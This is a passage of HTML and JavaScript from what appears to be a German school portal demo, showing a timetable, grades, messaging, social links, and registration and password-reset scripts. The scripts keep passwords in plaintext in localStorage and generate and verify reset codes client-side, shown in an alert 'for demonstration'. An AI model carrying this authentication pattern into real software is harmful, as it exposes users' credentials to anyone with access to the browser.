                                    <div class="time-slot-info">30 Minuten</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:30 - 11:30</div>
                                    <div class="time-slot-subject">Projekt</div>
                                    <div class="time-slot-info">Raum 105 • Hr. Weber</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">11:30 - 12:30</div>
                                    <div class="time-slot-subject">Projekt</div>
                                    <div class="time-slot-info">Raum 105 • Hr. Weber</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">12:30 - 13:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">1 Stunde</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">13:30 - 14:30</div>
                                    <div class="time-slot-subject">Kunst</div>
                                    <div class="time-slot-info">Kunstraum • Fr. Schaich</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">14:30 - 15:30</div>
                                    <div class="time-slot-subject">Religion/PP</div>
                                    <div class="time-slot-info">Raum 302 • Fr. Heuer</div>
                                </div>
                            </div>
                            <div class="time-column">
                                <div class="time-header">Dienstag</div>
                                <div class="time-slot">
                                    <div class="time-slot-time">08:00 - 09:00</div>
                                    <div class="time-slot-subject">Deutsch</div>
                                    <div class="time-slot-info">Raum 203 • Fr. Bierwirth</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">09:00 - 10:00</div>
                                    <div class="time-slot-subject">Epoche</div>
                                    <div class="time-slot-info">Raum 205 • Hr. Bierwirth</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:00 - 10:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">30 Minuten</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:30 - 11:30</div>
                                    <div class="time-slot-subject">Sport</div>
                                    <div class="time-slot-info">Sporthalle • Fr. Meyer</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">11:30 - 12:30</div>
                                    <div class="time-slot-subject">Mathematik</div>
                                    <div class="time-slot-info">Raum 101 • Hr. Müller</div>
                                </div>
                            </div>
                            <div class="time-column">
                                <div class="time-header">Mittwoch</div>
                                <div class="time-slot">
                                    <div class="time-slot-time">08:00 - 09:00</div>
                                    <div class="time-slot-subject">Deutsch</div>
                                    <div class="time-slot-info">Raum 203 • Fr. Bierwirth</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">09:00 - 10:00</div>
                                    <div class="time-slot-subject">Epoche</div>
                                    <div class="time-slot-info">Raum 205 • Hr. Schulz</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:00 - 10:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">30 Minuten</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:30 - 11:30</div>
                                    <div class="time-slot-subject">Englisch</div>
                                    <div class="time-slot-info">Raum 105 • Hr. Weber</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">11:30 - 12:30</div>
                                    <div class="time-slot-subject">Projekt</div>
                                    <div class="time-slot-info">Raum 105 • Hr. Weber</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">12:30 - 13:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">1 Stunde</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">13:30 - 14:30</div>
                                    <div class="time-slot-subject">Chemie/Physik</div>
                                    <div class="time-slot-info">Raum 302 • Fr. Wagner</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">14:30 - 15:30</div>
                                    <div class="time-slot-subject">Sport</div>
                                    <div class="time-slot-info">Sporthalle • Fr. Meyer</div>
                                </div>
                            </div>
                            <div class="time-column">
                                <div class="time-header">Donnerstag</div>
                                <div class="time-slot">
                                    <div class="time-slot-time">08:00 - 09:00</div>
                                    <div class="time-slot-subject">Epoche</div>
                                    <div class="time-slot-info">Raum 205 • Hr. Schulz</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">09:00 - 10:00</div>
                                    <div class="time-slot-subject">Lernstudio</div>
                                    <div class="time-slot-info">Raum 203 • Fr. Schmidt</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:00 - 10:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">30 Minuten</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:30 - 11:30</div>
                                    <div class="time-slot-subject">Englisch</div>
                                    <div class="time-slot-info">Raum 105 • Hr. Weber</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">11:30 - 12:30</div>
                                    <div class="time-slot-subject">Mathematik</div>
                                    <div class="time-slot-info">Raum 101 • Hr. Müller</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">12:30 - 13:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">1 Stunde</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">13:30 - 14:30</div>
                                    <div class="time-slot-subject">AG</div>
                                    <div class="time-slot-info">Verschiedene Räume</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">14:30 - 15:30</div>
                                    <div class="time-slot-subject">AG</div>
                                    <div class="time-slot-info">Verschiedene Räume</div>
                                </div>
                            </div>
                            <div class="time-column">
                                <div class="time-header">Freitag</div>
                                <div class="time-slot">
                                    <div class="time-slot-time">08:00 - 09:00</div>
                                    <div class="time-slot-subject">Deutsch</div>
                                    <div class="time-slot-info">Raum 203 • Fr. Schmidt</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">09:00 - 10:00</div>
                                    <div class="time-slot-subject">Hauswirtschaft/Technik</div>
                                    <div class="time-slot-info">Fachraum • Hr. Hoffmann</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:00 - 10:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">30 Minuten</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:30 - 11:30</div>
                                    <div class="time-slot-subject">WPU 1</div>
                                    <div class="time-slot-info">Verschiedene Räume</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">11:30 - 12:30</div>
                                    <div class="time-slot-subject">Epoche</div>
                                    <div class="time-slot-info">Raum 205 • Hr. Schulz</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">12:30 - 13:30</div>
                                    <div class="time-slot-subject">Pause</div>
                                    <div class="time-slot-info">1 Stunde</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">13:30 - 14:30</div>
                                    <div class="time-slot-subject">AG</div>
                                    <div class="time-slot-info">Verschiedene Räume</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">14:30 - 15:30</div>
                                    <div class="time-slot-subject">AG</div>
                                    <div class="time-slot-info">Verschiedene Räume</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Noten Seite -->
                <div class="page-container" id="noten-page">
                    <div class="card">
                        <div class="card-header">
                            <h2 class="card-title">Noten</h2>
                        </div>
                        <div class="all-grades">
                            <div class="grade-card">
                                <div class="grade-card-header">
                                    <div class="grade-card-title">Mathematik</div>
                                    <div class="grade-card-average good">2,0</div>
                                </div>
                                <div class="grade-card-content">
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Klassenarbeit: Algebra</div>
                                        <div class="grade good">2</div>
                                        <div class="grade-entry-date">15.03.2023</div>
                                    </div>
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Test: Geometrie</div>
                                        <div class="grade excellent">1</div>
                                        <div class="grade-entry-date">05.04.2023</div>
                                    </div>
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Klassenarbeit: Funktionen</div>
                                        <div class="grade average">3</div>
                                        <div class="grade-entry-date">10.05.2023</div>
                                    </div>
                                </div>
                            </div>
                            <div class="grade-card">
                                <div class="grade-card-header">
                                    <div class="grade-card-title">Deutsch</div>
                                    <div class="grade-card-average good">2,0</div>
                                </div>
                                <div class="grade-card-content">
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Aufsatz: Erörterung</div>
                                        <div class="grade good">2</div>
                                        <div class="grade-entry-date">20.03.2023</div>
                                    </div>
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Klassenarbeit: Literatur</div>
                                        <div class="grade good">2</div>
                                        <div class="grade-entry-date">18.04.2023</div>
                                    </div>
                                </div>
                            </div>
                            <div class="grade-card">
                                <div class="grade-card-header">
                                    <div class="grade-card-title">Englisch</div>
                                    <div class="grade-card-average excellent">1,5</div>
                                </div>
                                <div class="grade-card-content">
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Vokabeltest</div>
                                        <div class="grade excellent">1</div>
                                        <div class="grade-entry-date">12.03.2023</div>
                                    </div>
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Klassenarbeit: Grammar</div>
                                        <div class="grade good">2</div>
                                        <div class="grade-entry-date">22.04.2023</div>
                                    </div>
                                </div>
                            </div>
                            <div class="grade-card">
                                <div class="grade-card-header">
                                    <div class="grade-card-title">Physik</div>
                                    <div class="grade-card-average good">2,0</div>
                                </div>
                                <div class="grade-card-content">
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Test: Mechanik</div>
                                        <div class="grade good">2</div>
                                        <div class="grade-entry-date">25.03.2023</div>
                                    </div>
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Laborarbeit</div>
                                        <div class="grade good">2</div>
                                        <div class="grade-entry-date">15.04.2023</div>
                                    </div>
                                </div>
                            </div>
                            <div class="grade-card">
                                <div class="grade-card-header">
                                    <div class="grade-card-title">Biologie</div>
                                    <div class="grade-card-average average">3,0</div>
                                </div>
                                <div class="grade-card-content">
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Klassenarbeit: Ökologie</div>
                                        <div class="grade average">3</div>
                                        <div class="grade-entry-date">30.03.2023</div>
                                    </div>
                                </div>
                            </div>
                            <div class="grade-card">
                                <div class="grade-card-header">
                                    <div class="grade-card-title">Geschichte</div>
                                    <div class="grade-card-average good">2,0</div>
                                </div>
                                <div class="grade-card-content">
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Referat</div>
                                        <div class="grade excellent">1</div>
                                        <div class="grade-entry-date">05.03.2023</div>
                                    </div>
                                    <div class="grade-entry">
                                        <div class="grade-entry-title">Klassenarbeit</div>
                                        <div class="grade average">3</div>
                                        <div class="grade-entry-date">08.04.2023</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Nachrichten Seite -->
                <div class="page-container" id="nachrichten-page">
                    <div class="messages-container">
                        <div class="messages-sidebar">
                            <div class="messages-search">
                                <input type="text" class="messages-search-input" placeholder="Nachrichten durchsuchen..." onkeyup="searchMessages(this.value)">
                            </div>
                            <div class="messages-list" id="messages-list">
                                <!-- Nachrichten werden hier dynamisch eingefügt -->
                            </div>
                        </div>
                        <div class="message-content">
                            <div class="message-header">
                                <div class="message-subject" id="message-detail-subject">Wählen Sie eine Nachricht aus</div>
                                <div class="message-meta">
                                    <div class="message-sender" id="message-detail-sender"></div>
                                    <div class="message-date" id="message-detail-date"></div>
                                </div>
                            </div>
                            <div class="message-body" id="message-detail-content">
                                <p style="text-align: center; color: var(--gray-500);">Wählen Sie eine Nachricht aus der Liste aus, um sie hier anzuzeigen.</p>
                            </div>
                            <div class="message-reply">
                                <textarea class="message-reply-input" id="reply-content" placeholder="Antwort schreiben..."></textarea>
                                <div class="message-actions">
                                    <button class="btn btn-primary" onclick="sendReply()">Antworten</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Social Media Seite -->
                <div class="page-container" id="social-media-page">
                    <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; padding: 1.5rem;">
                        <!-- TikTok Card -->
                        <div class="social-card" onclick="window.open('https://www.tiktok.com/@mathildeanneke', '_blank')">
                            <div class="social-card-content">
                                <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                                    <path fill="currentColor" d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
                                </svg>
                                <h2 class="social-title">TikTok</h2>
                                <p class="social-description">Folge uns auf TikTok</p>
                                <div class="social-username">@mathildeanneke</div>
                            </div>
                        </div>

                        <!-- Instagram Card -->
                        <div class="social-card" onclick="window.open('https://www.instagram.com/mathildeanneke/', '_blank')">
                            <div class="social-card-content">
                                <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                    <path fill="currentColor" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                                </svg>
                                <h2 class="social-title">Instagram</h2>
                                <p class="social-description">Folge uns auf Instagram</p>
                                <div class="social-username">@mathildeanneke</div>
                            </div>
                        </div>

                        <!-- Schulwebsite Card -->
                        <div class="social-card" onclick="window.open('https://www.mathilde-anneke-schule.de/', '_blank')">
                            <div class="social-card-content">
                                <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                    <path fill="currentColor" d="M12 3L1 9l4 2.18v6L12 21l7-3.82v-6l2-1.09V17h2V9L12 3zm6.82 6L12 12.72 5.18 9 12 5.28 18.82 9zM17 15.99l-5 2.73-5-2.73v-3.72L12 15l5-2.73v3.72z"/>
                                </svg>
                                <h2 class="social-title">Schulwebsite</h2>
                                <p class="social-description">Besuche unsere Website</p>
                                <div class="social-username">mathilde-anneke-schule.de</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Mensa Seite -->
                <div class="page-container" id="mensa-page">
                    <div class="card" style="text-align: center; padding: 2rem; margin: 2rem auto; max-width: 600px;">
                        <h2 style="margin-bottom: 1.5rem; color: var(--primary-600);">MensaMax Anmeldung</h2>
                        <p style="font-size: 1.2rem; margin-bottom: 1rem; color: var(--gray-700);">Bitte melden Sie sich bei MensaMax an, um die Speisepläne einzusehen und Ihr Guthaben zu verwalten.</p>
                        <p style="color: var(--gray-500); margin-bottom: 2rem;">Sie werden in wenigen Sekunden automatisch weitergeleitet...</p>
                        <div class="loading-spinner" style="margin: 0 auto; width: 40px; height: 40px; border: 3px solid var(--gray-200); border-top-color: var(--primary-600); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Nachrichten-Modal -->
    <div class="modal" id="message-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Neue Nachricht</h2>
                <button class="modal-close" id="modal-close" onclick="document.getElementById('message-modal').classList.remove('open');">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <div class="message-form">
                    <div>
                        <label class="form-label">Empfänger auswählen</label>
                        <div class="recipients-list">
                            <div class="recipient" data-recipient="mueller">
                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                                <span class="recipient-name">Hr. Gökdemir</span>
                                <span class="recipient-role">Lehrer</span>
                            </div>
                            <div class="recipient" data-recipient="schmidt">
                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                                <span class="recipient-name">Hr. Bierwirth</span>
                                <span class="recipient-role">Lehrer</span>
                            </div>
                            <div class="recipient" data-recipient="weber">
                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                                <span class="recipient-name">Hr. Weber</span>
                                <span class="recipient-role">Lehrer</span>
                            </div>
                            <div class="recipient" data-recipient="schulleitung">
                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                                <span class="recipient-name">Schulleitung</span>
                                <span class="recipient-role">Verwaltung</span>
                            </div>
                        </div>
                    </div>
                    <div>
                        <label for="message-subject" class="form-label">Betreff</label>
                        <input type="text" id="message-subject" class="message-input" style="min-height: auto;" placeholder="Betreff eingeben">
                    </div>
                    <div>
                        <label for="message-content" class="form-label">Nachricht</label>
                        <textarea id="message-content" class="message-input" placeholder="Schreiben Sie Ihre Nachricht hier..."></textarea>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" id="cancel-message" onclick="document.getElementById('message-modal').classList.remove('open');">Abbrechen</button>
                <button class="btn btn-primary" id="send-message">Senden</button>
            </div>
        </div>
    </div>

    <!-- Passwort vergessen Modal mit direkten onclick-Attributen -->
    <div class="modal" id="forgot-password-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Passwort zurücksetzen</h2>
                <button class="modal-close" id="forgot-password-close" onclick="document.getElementById('forgot-password-modal').classList.remove('open'); document.getElementById('forgot-password-modal').style.display='none'; resetForgotForm();">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <!-- Schritt 1: E-Mail eingeben -->
                <div id="forgot-step-1">
                    <p>Bitte gib deine E-Mail-Adresse ein. Wir senden dir einen Code zur Bestätigung.</p>
                    <div class="form-group">
                        <label for="forgot-email">E-Mail-Adresse</label>
                        <input id="forgot-email" type="email" placeholder="E-Mail-Adresse eingeben" required>
                    </div>
                </div>

                <!-- Schritt 2: Code bestätigen -->
                <div id="forgot-step-2" style="display: none;">
                    <p>Wir haben einen 6-stelligen Code an deine E-Mail-Adresse gesendet. Bitte gib den Code hier ein.</p>
                    <div class="form-group">
                        <label for="forgot-code">Verifizierungscode</label>
                        <input id="forgot-code" type="text" placeholder="6-stelligen Code eingeben" maxlength="6" required>
                    </div>
                </div>

                <!-- Schritt 3: Neues Passwort eingeben -->
                <div id="forgot-step-3" style="display: none;">
                    <p>Bitte gib dein neues Passwort ein.</p>
                    <div class="form-group">
                        <label for="new-password">Neues Passwort</label>
                        <input id="new-password" type="password" placeholder="Neues Passwort eingeben" required>
                    </div>
                    <div class="form-group">
                        <label for="confirm-new-password">Passwort bestätigen</label>
                        <input id="confirm-new-password" type="password" placeholder="Passwort wiederholen" required>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" id="forgot-cancel" onclick="document.getElementById('forgot-password-modal').classList.remove('open'); document.getElementById('forgot-password-modal').style.display='none'; resetForgotForm();">Abbrechen</button>
                <button class="btn btn-primary" id="forgot-next" onclick="handleForgotStep()">Weiter</button>
            </div>
        </div>
    </div>

    <!-- Neue Funktion zum Verarbeiten der Schritte im Passwort-Zurücksetzen-Prozess -->
    <script>
        // Funktion zum Verarbeiten der Schritte im Passwort-Zurücksetzen-Prozess
        function handleForgotStep() {
            // Bestimme den aktuellen Schritt
            let currentStep = 1;
            if (document.getElementById('forgot-step-2').style.display === 'block') {
                currentStep = 2;
            } else if (document.getElementById('forgot-step-3').style.display === 'block') {
                currentStep = 3;
            }
            
            console.log("Verarbeite Schritt:", currentStep);
            
            if (currentStep === 1) {
                // E-Mail validieren
                const forgotEmail = document.getElementById('forgot-email').value;
                if (!forgotEmail || !forgotEmail.includes('@')) {
                    alert('Bitte gib eine gültige E-Mail-Adresse ein.');
                    return;
                }
                
                // Prüfen, ob die E-Mail bei einem registrierten Benutzer existiert
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                const user = registeredUsers.find(u => u.contact === forgotEmail);
                
                if (!user) {
                    alert('Diese E-Mail-Adresse ist nicht registriert.');
                    return;
                }
                
                // Speichere die E-Mail für spätere Schritte
                localStorage.setItem('forgotEmail', forgotEmail);
                
                // Verifizierungscode generieren und speichern
                const forgotCode = generateRandomCode(6);
                localStorage.setItem('forgotCode', forgotCode);
                
                // In einer echten Anwendung würde hier eine E-Mail gesendet werden
                alert('Ein Verifizierungscode wurde an ' + forgotEmail + ' gesendet.\n\n' +
                      'In einer echten Anwendung würde eine E-Mail gesendet werden.\n\n' +
                      'Zu Demonstrationszwecken: Dein Code ist ' + forgotCode);
                
                // Zum nächsten Schritt
                document.getElementById('forgot-step-1').style.display = 'none';
                document.getElementById('forgot-step-2').style.display = 'block';
                document.getElementById('forgot-step-3').style.display = 'none';
            } 
            else if (currentStep === 2) {
                // Code validieren
                const enteredCode = document.getElementById('forgot-code').value;
                const savedCode = localStorage.getItem('forgotCode');
                
                if (!enteredCode || enteredCode.length !== 6) {
                    alert('Bitte gib den 6-stelligen Code ein.');
                    return;
                }
                
                if (enteredCode !== savedCode) {
                    alert('Der eingegebene Code ist nicht korrekt. Bitte versuche es erneut.');
                    return;
                }
                
                // Zum nächsten Schritt
                document.getElementById('forgot-step-1').style.display = 'none';
                document.getElementById('forgot-step-2').style.display = 'none';
                document.getElementById('forgot-step-3').style.display = 'block';
                
                // Button-Text ändern
                document.getElementById('forgot-next').textContent = 'Passwort ändern';
            } 
            else if (currentStep === 3) {
                // Neue Passwörter validieren
                const newPassword = document.getElementById('new-password').value;
                const confirmNewPassword = document.getElementById('confirm-new-password').value;
                const forgotEmail = localStorage.getItem('forgotEmail');
                
                if (!newPassword) {
                    alert('Bitte gib ein neues Passwort ein.');
                    return;
                }
                
                if (newPassword !== confirmNewPassword) {
                    alert('Die Passwörter stimmen nicht überein.');
                    return;
                }
                
                // Passwort in localStorage aktualisieren
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                const userIndex = registeredUsers.findIndex(u => u.contact === forgotEmail);
                
                if (userIndex !== -1) {
                    registeredUsers[userIndex].password = newPassword;
                    localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                    
                    alert('Dein Passwort wurde erfolgreich geändert. Du kannst dich jetzt mit deinem neuen Passwort anmelden.');
                    
                    // Modal schließen und Formular zurücksetzen
                    const modal = document.getElementById('forgot-password-modal');
                    modal.classList.remove('open');
                    modal.style.display = 'none';
                    resetForgotForm();
                    
                    // Temporäre Daten löschen
                    localStorage.removeItem('forgotEmail');
                    localStorage.removeItem('forgotCode');
                }
            }
        }
        
        // Funktion zum Zurücksetzen des Formulars
        function resetForgotForm() {
            document.getElementById('forgot-email').value = '';
            document.getElementById('forgot-code').value = '';
            document.getElementById('new-password').value = '';
            document.getElementById('confirm-new-password').value = '';
            
            // Zurücksetzen auf Schritt 1
            document.getElementById('forgot-step-1').style.display = 'block';
            document.getElementById('forgot-step-2').style.display = 'none';
            document.getElementById('forgot-step-3').style.display = 'none';
            
            // Button-Text zurücksetzen
            document.getElementById('forgot-next').textContent = 'Weiter';
        }
    </script>

    <script>
        // Einfache globale Funktionen für die Tab-Umschaltung
        function showLoginTab() {
            document.getElementById('login-tab').classList.add('active');
            document.getElementById('register-tab').classList.remove('active');
            document.getElementById('login-form').style.display = 'block';
            document.getElementById('register-form').style.display = 'none';
        }
        
        function showRegisterTab() {
            document.getElementById('register-tab').classList.add('active');
            document.getElementById('login-tab').classList.remove('active');
            document.getElementById('register-form').style.display = 'block';
            document.getElementById('login-form').style.display = 'none';
        }
        
        // Funktionen für die Registrierungsschritte
        function nextStep(currentStep) {
            // Validierung für jeden Schritt
            if (currentStep === 1) {
                const fullname = document.getElementById('register-fullname').value;
                if (!fullname) {
                    alert('Bitte gib deinen vollständigen Namen ein.');
                    return;
                }
            } else if (currentStep === 2) {
                const isEmail = document.getElementById('email-option').classList.contains('active');
                if (isEmail) {
                    const email = document.getElementById('register-email').value;
                    if (!email || !email.includes('@')) {
                        alert('Bitte gib eine gültige E-Mail-Adresse ein.');
                        return;
                    }
                } else {
                    const phone = document.getElementById('register-phone').value;
                    if (!phone || phone.length < 6) {
                        alert('Bitte gib eine gültige Telefonnummer ein.');
                        return;
                    }
                }
            } else if (currentStep === 3) {
                const username = document.getElementById('register-username').value;
                const school = document.getElementById('register-school').value;
                if (!username) {
                    alert('Bitte gib einen Benutzernamen ein.');
                    return;
                }
                if (!school) {
                    alert('Bitte wähle eine Schule aus.');
                    return;
                }
                
                // Prüfen, ob Benutzername bereits existiert
                const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                if (registeredUsers.some(u => u.username === username)) {
                    alert('Dieser Benutzername existiert bereits. Bitte wähle einen anderen.');
                    return;
                }
            } else if (currentStep === 4) {
                const password = document.getElementById('register-password').value;
                const confirmPassword = document.getElementById('register-confirm-password').value;
                if (!password) {
                    alert('Bitte gib ein Passwort ein.');
                    return;
                }
                if (password !== confirmPassword) {
                    alert('Die Passwörter stimmen nicht überein.');
                    return;
                }
            } else if (currentStep === 5) {
                // Zusammenfassung anzeigen
                document.getElementById('summary-name').textContent = 'Name: ' + document.getElementById('register-fullname').value;
                
                const isEmail = document.getElementById('email-option').classList.contains('active');
                if (isEmail) {
                    document.getElementById('summary-contact').textContent = 'E-Mail: ' + document.getElementById('register-email').value;
                } else {
                    document.getElementById('summary-contact').textContent = 'Telefon: ' + document.getElementById('register-phone').value;
                }
                
                document.getElementById('summary-username').textContent = 'Benutzername: ' + document.getElementById('register-username').value;
                document.getElementById('summary-school').textContent = 'Schule: ' + document.getElementById('register-school').value;
                document.getElementById('summary-class').textContent = 'Klasse: ' + document.getElementById('register-class').value;
                document.getElementById('summary-teacher').textContent = 'Rolle: ' + (document.getElementById('register-teacher').checked ? 'Lehrer' : 'Schüler');
            }
            
            // Zum nächsten Schritt wechseln
            document.getElementById('step-' + currentStep).classList.remove('active');
            document.getElementById('step-' + (currentStep + 1)).classList.add('active');
        }
        
        function prevStep(currentStep) {
            document.getElementById('step-' + currentStep).classList.remove('active');
            document.getElementById('step-' + (currentStep - 1)).classList.add('active');
        }
        
        // Neue Funktion zur Validierung und Übermittlung des Registrierungsformulars
        function validateAndSubmitRegistration() {
            // Prüfen, ob die Nutzungsbedingungen akzeptiert wurden
            const termsCheckbox = document.getElementById('register-terms');
            if (!termsCheckbox.checked) {
                alert('Bitte akzeptiere die Nutzungsbedingungen, um fortzufahren.');
                return;
            }
            
            // Daten aus allen Schritten sammeln
            const fullname = document.getElementById('register-fullname').value;
            const username = document.getElementById('register-username').value;
            const school = document.getElementById('register-school').value;
            const password = document.getElementById('register-password').value;
            
            // Kontaktinformationen je nach gewählter Option
            let contact = '';
            if (document.getElementById('email-option').classList.contains('active')) {
                contact = document.getElementById('register-email').value;
            } else {
                contact = document.getElementById('register-phone').value;
            }
            
            // Überprüfen, ob der Benutzername bereits existiert
            const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
            if (registeredUsers.some(u => u.username === username)) {
                alert('Dieser Benutzername existiert bereits. Bitte wähle einen anderen.');
                return;
            }
            
            // 6-stelligen Verifizierungscode generieren
            const verificationCode = generateRandomCode(6);
            
            // Daten für die Verifizierung zwischenspeichern
            const pendingUser = {
                fullname: fullname,
                username: username,
